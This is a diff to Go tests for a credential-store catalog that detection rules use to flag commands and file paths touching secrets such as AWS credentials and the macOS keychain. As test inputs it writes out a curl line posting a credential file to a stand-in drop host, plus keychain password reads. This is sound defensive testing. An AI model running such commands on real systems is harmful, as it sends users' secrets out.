@@ -1,6 +1,7 @@
 package concepts
 
 import (
+	"os"
 	"path/filepath"
 	"reflect"
 	"regexp"
@@ -268,6 +269,10 @@ func TestDecodeAndCheckRefuse(t *testing.T) {
 		"command counterexample is one":   {`counterexamples: ["aws configure list"]`, `counterexamples: ["echo $(security find-generic-password -w)"]`, `store aws-export: counterexample "echo $(security find-generic-password -w)": is store macos-keychain`},
 		"path example for a command":      {`examples: ["security find-generic-password -s GitHub -w"]`, `examples: ["/home/u/Library/Keychains/login.keychain-db"]`, "not matched"},
 		"command counterexample no parse": {`counterexamples: ["security find-generic-password -s GitHub"]`, `counterexamples: ["security 'x"]`, `store macos-keychain: counterexample "security 'x"`},
+		// What a rule runs is held to the examples too: credential_mention would name this
+		// counterexample a store wherever a command line writes it.
+		"counterexample a generated expression takes": {`counterexamples: ["/home/u/.aws/config"]`, `counterexamples: ["/home/u/.aws/config", "/srv/.aws/credentials@old"]`,
+			`store aws: counterexample "/srv/.aws/credentials@old": the expression generated for a text that names the definite stores says true of the path, the catalog false`},
 	} {
 		if !strings.Contains(smallCatalog, tc.old) {
 			t.Fatalf("%s: the catalog does not contain %q", name, tc.old)
@@ -282,14 +287,18 @@ func TestDecodeAndCheckRefuse(t *testing.T) {
 	}
 }
 
-// credentialStores loads the catalog the rule pack ships.
+// credentialStores decodes and checks the catalog the rule pack ships.
 func credentialStores(t *testing.T) *Catalog {
 	t.Helper()
 	_, thisFile, _, ok := runtime.Caller(0)
 	if !ok {
 		t.Fatal("runtime.Caller failed")
 	}
-	c, err := Load(filepath.Join(filepath.Dir(thisFile), "..", "..", "..", "rules", "concepts", "credential-stores.catalog.yaml"))
+	data, err := os.ReadFile(filepath.Join(filepath.Dir(thisFile), "..", "..", "..", "rules", "concepts", "credential-stores.catalog.yaml"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	c, err := Decode(data)
 	if err == nil {
 		err = c.Check()
 	}
@@ -299,18 +308,20 @@ func credentialStores(t *testing.T) *Catalog {
 	return c
 }
 
-// selections are the selections a rule can ask for by kind: every kind, and each one.
-func selections(c *Catalog) [][]string {
-	all := [][]string{nil}
-	for _, k := range c.Kinds {
-		all = append(all, []string{k.ID})
+// Decode does not require a store to give an example, so the reference renders a catalog
+// without one, with an empty cell.
+func TestMarkdownWithoutAnExample(t *testing.T) {
+	c, err := Decode([]byte(strings.Replace(smallCatalog, `    examples: ["/home/u/.aws/credentials"]`+"\n", "", 1)))
+	if err != nil {
+		t.Fatal(err)
 	}
-	return all
-}
-
-// inSelection reports whether a store is one a selection takes.
-func inSelection(s *Store, tier Tier, kinds []string) bool {
-	return tier.includes(s.Tier) && (kinds == nil || kinds[0] == s.Kind)
+	md, err := c.Markdown("test.catalog.yaml", "regenerate")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if want := "| `aws`: AWS shared credentials | definite | `.aws/credentials` |  |  |\n"; !strings.Contains(md, want) {
+		t.Errorf("Markdown has no row %q:\n%s", want, md)
+	}
 }
 
 // pathVariants are paths near path: the ones a careless pattern or expression gets wrong.
@@ -339,64 +350,36 @@ func pathVariants(path string) []string {
 	}
 }
 
-// TestCredentialStoresPathExpressionsAgree is the conformance check of the expressions generated
-// for files: for every selection a rule can ask for, the regular expressions accept exactly the
-// paths the catalog's own matcher does, over every example and counterexample and the paths near
-// them.
+// TestCredentialStoresPathExpressionsAgree holds the expressions generated for files (a path,
+// and a text that names one) to the catalog's matcher beyond what Check asks of the examples:
+// for every selection a rule can ask for, over the paths near every example and counterexample.
 func TestCredentialStoresPathExpressionsAgree(t *testing.T) {
 	c := credentialStores(t)
-	var paths []string
+	generated, err := c.expressions()
+	if err != nil {
+		t.Fatal(err)
+	}
+	stores, asked := 0, 0
 	for _, s := range c.Stores {
 		if len(s.Commands) > 0 {
 			continue
 		}
 		for _, p := range slices.Concat(s.Examples, s.Counterexamples) {
-			paths = append(paths, pathVariants(p)...)
-		}
-	}
-	accepted, asked := 0, 0
-	for _, tier := range []Tier{TierDefinite, TierLikely} {
-		for _, kinds := range selections(c) {
-			selection, err := c.Select(tier, kinds...)
-			if err != nil {
-				t.Fatal(err)
-			}
-			type compiled struct{ include, exclude *regexp.Regexp }
-			terms := make([]compiled, len(selection.Paths))
-			for i, term := range selection.Paths {
-				terms[i].include = regexp.MustCompile(term.Include)
-				if term.Exclude != "" {
-					terms[i].exclude = regexp.MustCompile(term.Exclude)
-				}
-			}
-			for _, path := range paths {
-				want := false
-				comps := splitPath(path)
-				for i := range c.Stores {
-					if s := &c.Stores[i]; inSelection(s, tier, kinds) && s.matchesComponents(comps) {
-						want = true
-					}
-				}
-				got := false
-				for _, term := range terms {
-					if term.include.MatchString(path) && (term.exclude == nil || !term.exclude.MatchString(path)) {
-						got = true
-					}
-				}
-				if got != want {
-					t.Errorf("%s stores of kinds %q: the expression says %v for %q, the catalog %v", tier, kinds, got, path, want)
+			for _, path := range pathVariants(p) {
+				if err := generated.checkPath(c, path); err != nil {
+					t.Errorf("%q: %v", path, err)
 				}
 				asked++
-				if got {
-					accepted++
+				if _, ok := c.Lookup(path); ok {
+					stores++
 				}
 			}
 		}
 	}
-	// The check is of little worth if the paths near the examples were all rejected, or all taken.
-	t.Logf("%d paths: %d of %d answers were yes", len(paths), accepted, asked)
-	if accepted == 0 || accepted == asked {
-		t.Errorf("%d of %d answers were yes: the variants do not exercise the expressions", accepted, asked)
+	// The check is of little worth if the paths near the examples were all stores, or none.
+	t.Logf("%d paths, %d of them stores", asked, stores)
+	if stores == 0 || stores == asked {
+		t.Errorf("%d of %d paths are stores: the variants do not exercise the expressions", stores, asked)
 	}
 }
 
@@ -421,54 +404,43 @@ func compiledOnce(expr string) *regexp.Regexp {
 	return re
 }
 
-// TestCredentialStoresMentionExpressionsAgree holds the expressions for a text to the ones for a
-// path: a command line that names one path, in a directory and without a space in it, mentions
-// a selection exactly when the path is in it, whether the path is quoted, redirected from,
+// TestCredentialStoresMentionExpressionsAgree holds the expressions for a text to the matcher: a
+// command line that names one path, in a directory and without a space in it, mentions a
+// selection exactly when the path is in it, whether the path is quoted, redirected from,
 // assigned or ends a sentence.
 func TestCredentialStoresMentionExpressionsAgree(t *testing.T) {
 	c := credentialStores(t)
-	var paths []string
+	generated, err := c.expressions()
+	if err != nil {
+		t.Fatal(err)
+	}
+	mentions := 0
 	for _, s := range c.Stores {
 		if len(s.Commands) > 0 {
 			continue
 		}
 		for _, p := range slices.Concat(s.Examples, s.Counterexamples) {
-			for _, variant := range pathVariants(p) {
-				if strings.ContainsAny(variant, `/\`) && !strings.ContainsAny(variant, " \t") {
-					paths = append(paths, variant)
+			for _, path := range pathVariants(p) {
+				if !strings.ContainsAny(path, `/\`) || strings.ContainsAny(path, " \t") {
+					continue
 				}
-			}
-		}
-	}
-	mentions := 0
-	for _, tier := range []Tier{TierDefinite, TierLikely} {
-		for _, kinds := range selections(c) {
-			selection, err := c.Select(tier, kinds...)
-			if err != nil {
-				t.Fatal(err)
-			}
-			for _, path := range paths {
-				want := false
 				comps := splitPath(path)
-				for i := range c.Stores {
-					if s := &c.Stores[i]; inSelection(s, tier, kinds) && s.matchesComponents(comps) {
-						want = true
+				for _, g := range generated {
+					want := c.selected(g, func(s *Store) bool { return s.matchesComponents(comps) })
+					for _, text := range []string{
+						"cat '" + path + "' | wc -c",
+						`curl -d @"` + path + `" https://drop.example`,
+						"KEY=" + path + "; export KEY",
+						"sort <" + path + ">out",
+						"claude -p 'summarize " + path + ".'",
+					} {
+						if got := evalBool(g.mention, map[string]any{"s": text}); got != want {
+							t.Errorf("%s: the expression says %v for the text %q, the catalog %v for the path", g, got, text, want)
+						}
 					}
-				}
-				for _, text := range []string{
-					path,
-					"cat '" + path + "' | wc -c",
-					`curl -d @"` + path + `" https://drop.example`,
-					"KEY=" + path + "; export KEY",
-					"sort <" + path + ">out",
-					"claude -p 'summarize " + path + ".'",
-				} {
-					if got := mentioned(selection, text); got != want {
-						t.Errorf("%s stores of kinds %q: the expression says %v for the text %q, the catalog %v for the path", tier, kinds, got, text, want)
+					if want {
+						mentions++
 					}
-				}
-				if want {
-					mentions++
 				}
 			}
 		}
@@ -543,10 +515,14 @@ func commandVariants(inv invocation) []invocation {
 
 // TestCredentialStoresCommandExpressionsAgree is the same check for commands: the expressions
 // over a command's name and its arguments as text accept exactly the commands the catalog's own
-// matcher does, over the commands of every example and counterexample and the ones near them.
+// matcher does, over the commands near those of every example and counterexample.
 func TestCredentialStoresCommandExpressionsAgree(t *testing.T) {
 	c := credentialStores(t)
-	var commands []invocation
+	generated, err := c.expressions()
+	if err != nil {
+		t.Fatal(err)
+	}
+	stores, asked := 0, 0
 	for _, s := range c.Stores {
 		if len(s.Commands) == 0 {
 			continue
@@ -557,56 +533,21 @@ func TestCredentialStoresCommandExpressionsAgree(t *testing.T) {
 				t.Fatal(err)
 			}
 			for _, inv := range parsed {
-				commands = append(commands, commandVariants(inv)...)
-			}
-		}
-	}
-	accepted, asked := 0, 0
-	for _, tier := range []Tier{TierDefinite, TierLikely} {
-		for _, kinds := range selections(c) {
-			selection, err := c.Select(tier, kinds...)
-			if err != nil {
-				t.Fatal(err)
-			}
-			type compiled struct{ name, words, flags *regexp.Regexp }
-			terms := make([]compiled, len(selection.Commands))
-			for i, term := range selection.Commands {
-				terms[i].name = regexp.MustCompile(term.Name)
-				if term.Words != "" {
-					terms[i].words = regexp.MustCompile(term.Words)
-				}
-				if term.Flags != "" {
-					terms[i].flags = regexp.MustCompile(term.Flags)
-				}
-			}
-			for _, inv := range commands {
-				want := false
-				for i := range c.Stores {
-					if s := &c.Stores[i]; inSelection(s, tier, kinds) && s.matchesCommand(inv.name, inv.args) {
-						want = true
+				for _, variant := range commandVariants(inv) {
+					if err := generated.checkCommand(c, variant); err != nil {
+						t.Error(err)
 					}
-				}
-				// The arguments as a rule reads them: one word per line.
-				text := strings.Join(inv.args, "\n")
-				got := false
-				for _, term := range terms {
-					if term.name.MatchString(inv.name) && (term.words == nil || term.words.MatchString(text)) && (term.flags == nil || term.flags.MatchString(text)) {
-						got = true
+					asked++
+					if _, ok := c.LookupCommand(variant.name, variant.args); ok {
+						stores++
 					}
-				}
-				if got != want {
-					t.Errorf("%s stores of kinds %q: the expression says %v for %s %q, the catalog %v", tier, kinds, got, inv.name, inv.args, want)
-				}
-				asked++
-				if got {
-					accepted++
 				}
 			}
 		}
 	}
-	t.Logf("%d commands: %d of %d answers were yes", len(commands), accepted, asked)
-	if accepted == 0 || accepted == asked {
-		t.Errorf("%d of %d answers were yes: the variants do not exercise the expressions", accepted, asked)
+	t.Logf("%d commands, %d of them stores", asked, stores)
+	if stores == 0 || stores == asked {
+		t.Errorf("%d of %d commands are stores: the variants do not exercise the expressions", stores, asked)
 	}
 }
 
@@ -626,11 +567,15 @@ func TestCredentialStoresKindsAndTiersAreUsed(t *testing.T) {
 }
 
 // TestCredentialStoresRedactedExpression holds the expression for a redacted command line to
-// what a log holds. Redaction replaces a command's name where the command's output is put
-// right after a secret's label: today after the colon of curl's -u, and, in the logs a Beacon
-// wrote before redaction kept the opening of a command substitution, in an assignment to TOKEN
-// and in a bearer header. What the log keeps is still found when the match has words to tell
-// the command by. No counterexample is.
+// what a log holds. Redaction used to replace a command's name where the command's output is put
+// right after a secret's label: after the colon of curl's -u, and, in the logs a Beacon wrote
+// before redaction kept the opening of a command substitution, in an assignment to TOKEN and in a
+// bearer header. What those logs keep is still found when the match has words to tell the command
+// by. No counterexample is. The sanitizer now keeps the substitution whole in all three, so a log
+// it writes names the command, unless a word of the command line could be a secret written out
+// (an echo's literal, a user@host, a key ID): then the substitution is replaced whole. Where the
+// substitution opens with an assignment it still replaces the opening, the command's name with
+// it, and the expression finds what it leaves.
 func TestCredentialStoresRedactedExpression(t *testing.T) {
 	c := credentialStores(t)
 	all, err := c.Select(TierLikely)
@@ -638,17 +583,29 @@ func TestCredentialStoresRedactedExpression(t *testing.T) {
 		t.Fatalf("no redacted expression: %v", err)
 	}
 	expression := regexp.MustCompile(all.Redacted)
-	// logged returns what a log holds of a command line that runs command, whose name is name,
-	// for its output: the first as the sanitizer writes it now, the others as it used to.
+	sanitized := func(line string) string {
+		return asymptoteobserve.SanitizeEvent(asymptoteobserve.Event{Command: &asymptoteobserve.CommandInfo{Command: line}}, 64*1024).Command.Command
+	}
+	// logged returns what logs hold of a command line that runs command, whose name is name, for
+	// its output: what older logs hold, and what the sanitizer writes now of a substitution that
+	// opens with an assignment. It first checks that the sanitizer now keeps the command in the
+	// others, or else leaves none of its words.
 	logged := func(command, name string) []string {
-		event := asymptoteobserve.SanitizeEvent(asymptoteobserve.Event{Command: &asymptoteobserve.CommandInfo{
-			Command: `curl -u "deploy:$(` + command + `)" https://api.example`,
-		}}, 64*1024)
 		rest := strings.TrimPrefix(command, name)
+		for _, line := range []string{
+			`curl -u "deploy:$(` + command + `)" https://api.example`,
+			`TOKEN=$(` + command + `)`,
+			`curl -H "Authorization: Bearer $(` + command + `)" https://api.example`,
+		} {
+			if got := sanitized(line); !strings.Contains(got, "$("+name+" ") && strings.Contains(got, strings.TrimSpace(rest)) {
+				t.Errorf("the sanitizer neither kept the command of %q nor replaced it whole: %q", line, got)
+			}
+		}
 		return []string{
-			event.Command.Command,
+			`curl -u "deploy:[REDACTED]` + rest + `)" https://api.example`,
 			"TOKEN=[REDACTED]" + rest + ")",
 			`curl -H "Authorization: Bearer [REDACTED]` + rest + `)" https://api.example`,
+			sanitized(`TOKEN=$(GH_TOKEN=$(` + command + `) ./x)`),
 		}
 	}
 	// alone returns the one command a line runs when the line is that command and no more.
@@ -723,11 +680,21 @@ func TestNamedTellsACopyFromAWord(t *testing.T) {
 	}
 }
 
-// A candidate is a file that is read, named like a credential's and in no store: what the
-// catalog's reviewers have not seen. A store, source code, documentation and a template are not.
-func TestCandidatesAreCredentialLikeFilesTheCatalogLacks(t *testing.T) {
-	c := credentialStores(t)
-	got := c.Candidates([]string{
+// A candidate is a file that is read, named like a credential's and in no catalog's store: what
+// the catalogs' reviewers have not seen. A store of any catalog, source code, documentation and
+// a template are not.
+func TestCandidatesAreCredentialLikeFilesTheCatalogsLack(t *testing.T) {
+	other, err := Decode([]byte(`
+catalog: app-stores
+version: 1
+kinds: [{id: app, title: App}]
+stores:
+  - {id: backup-passphrase, title: Backup passphrase, kind: app, tier: definite, match: [backup-passphrase]}
+`))
+	if err != nil {
+		t.Fatal(err)
+	}
+	got := Candidates([]string{
 		"/srv/app/config/master.key",
 		"/home/u/work/client_secret.json",
 		"/home/u/other/client_secret.json",
@@ -735,12 +702,13 @@ func TestCandidatesAreCredentialLikeFilesTheCatalogLacks(t *testing.T) {
 		"/home/u/.config/app/auth-token:1-20",
 		"/home/u/.aws/credentials",       // a store
 		"/repo/.env",                     // a store
+		"/opt/app/backup-passphrase",     // a store of the other catalog
 		"/repo/src/auth/credentials.go",  // source code
 		"/repo/docs/token-usage.mdx:26",  // documentation, with a line selector
 		"/repo/config/secrets.yaml.tmpl", // a template
 		"/repo/rules/x/credentials-in-curl-data.rule.yaml",
 		"/repo/README.md",
-	})
+	}, credentialStores(t), other)
 	want := []Candidate{
 		{Name: "client_secret.json", Reads: 2, Example: "/home/u/work/client_secret.json"},
 		{Name: "auth-token", Reads: 1, Example: "/home/u/.config/app/auth-token"},
